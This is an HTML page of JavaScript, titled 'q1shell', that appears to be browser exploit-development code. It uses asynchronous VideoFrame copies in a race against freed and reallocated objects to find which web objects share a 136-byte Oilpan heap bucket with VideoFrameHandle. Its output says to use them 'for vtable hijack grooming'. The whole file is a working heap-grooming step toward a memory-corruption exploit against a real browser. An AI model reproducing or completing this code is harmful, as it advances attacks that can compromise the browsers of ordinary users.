<!doctype html>
<html>
<head><title>q1shell</title></head>
<body style="background:#000;color:#0f0;font-family:monospace;font-size:12px;padding:20px;">
<div id="out"></div>
<script>
const log = s => { out.innerHTML += s + '<br>'; console.log(s); };
log('Oilpan size oracle — finding 136-byte match');
log('');

async function testObject(label, makeObj) {
    const canvas = new OffscreenCanvas(64, 64);
    const gl = canvas.getContext('webgl');
    gl.clearColor(1.0, 0.0, 0.0, 1.0);
    gl.clear(gl.COLOR_BUFFER_BIT);
    gl.finish();

    // baseline
    const bf = new VideoFrame(canvas, {timestamp:0});
    const bb = new Uint8Array(bf.allocationSize());
    await bf.copyTo(bb); bf.close();

    // free 3000 slots
    const objs = [];
    for (let i = 0; i < 3000; i++) objs.push(makeObj(i));
    objs.length = 0;

    let groomed = 0;
    for (let a = 0; a < 30; a++) {
        gl.clearColor(1,0,0,1); gl.clear(gl.COLOR_BUFFER_BIT); gl.finish();
        const f = new VideoFrame(canvas, {timestamp: a*1000});
        const buf = new Uint8Array(f.allocationSize());
        const p = f.copyTo(buf);
        f.close();
        const s = [];
        for (let j = 0; j < 30; j++) s.push(makeObj(j));
        await p;
        s.length = 0;
        if (buf.some((b,i) => b !== bb[i])) groomed++;
    }

    const result = groomed + '/30';
    log((groomed > 0 ? '[HIT] ' : '[ -- ] ') + label + ': ' + result);
    return groomed;
}

async function run() {
    const ctx = new AudioContext();

    const tests = [
        ['AudioParam',      i => ctx.createGain().gain],
        ['TextDecoder',     i => new TextDecoder()],
        ['TextEncoder',     i => new TextEncoder()],
        ['DOMMatrix',       i => new DOMMatrix()],
        ['DOMPoint',        i => new DOMPoint()],
        ['DOMRect',         i => new DOMRect()],
        ['AbortController', i => new AbortController()],
        ['AbortSignal',     i => new AbortController().signal],
        ['URL',             i => new URL('https://x.com/' + i)],
        ['URLSearchParams', i => new URLSearchParams('a=' + i)],
        ['Headers',         i => new Headers({'x-test': String(i)})],
        ['Request',         i => new Request('https://x.com/' + i)],
        ['MessageChannel',  i => new MessageChannel()],
        ['MessagePort',     i => new MessageChannel().port1],
        ['Blob',            i => new Blob(['x'.repeat(i % 64)])],
        ['File',            i => new File(['x'], 'f'+i)],
        ['FormData',        i => new FormData()],
        ['EncodedAudioChunk', i => {
            try {
                return new EncodedAudioChunk({type:'key',timestamp:i,data:new Uint8Array(4)});
            } catch(e) { return null; }
        }],
        ['AudioData',       i => {
            try {
                return new AudioData({format:'f32',sampleRate:44100,numberOfFrames:128,numberOfChannels:1,timestamp:i,data:new Float32Array(128)});
            } catch(e) { return null; }
        }],
        ['VideoFrame canvas', i => {
            const c = new OffscreenCanvas(4,4);
            const f = new VideoFrame(c, {timestamp:i});
            return f;
        }],
        ['ImageData',       i => new ImageData(8, 8)],
        ['ImageBitmap',     i => null], // async, skip
        ['PerformanceMark', i => { try { return performance.mark('m'+i); } catch(e){return null;} }],
        ['ReadableStream',  i => new ReadableStream()],
        ['WritableStream',  i => new WritableStream()],
        ['TransformStream', i => new TransformStream()],
        ['EventTarget',     i => new EventTarget()],
        ['CustomEvent',     i => new CustomEvent('x', {detail: i})],
        ['MutationObserver',i => new MutationObserver(()=>{})],
        ['IntersectionObserver', i => { try { return new IntersectionObserver(()=>{}); } catch(e){return null;} }],
        ['ResizeObserver',  i => new ResizeObserver(()=>{})],
    ];

    let hits = [];
    for (const [label, maker] of tests) {
        try {
            const groomed = await testObject(label, maker);
            if (groomed > 0) hits.push(label);
        } catch(e) {
            log('[ EE ] ' + label + ': ' + e.message);
        }
    }

    log('');
    log('HITS: ' + (hits.length > 0 ? hits.join(', ') : 'none'));
    if (hits.length > 0) {
        log('These objects share 136-byte Oilpan bucket with VideoFrameHandle!');
        log('Use them for vtable hijack grooming.');
    } else {
        log('No hits. VideoFrameHandle may be in a non-standard Oilpan arena.');
        log('Try timing-based size oracle next.');
    }
}

run().catch(e => log('ERR: ' + e));
</script>
</body>
</html>
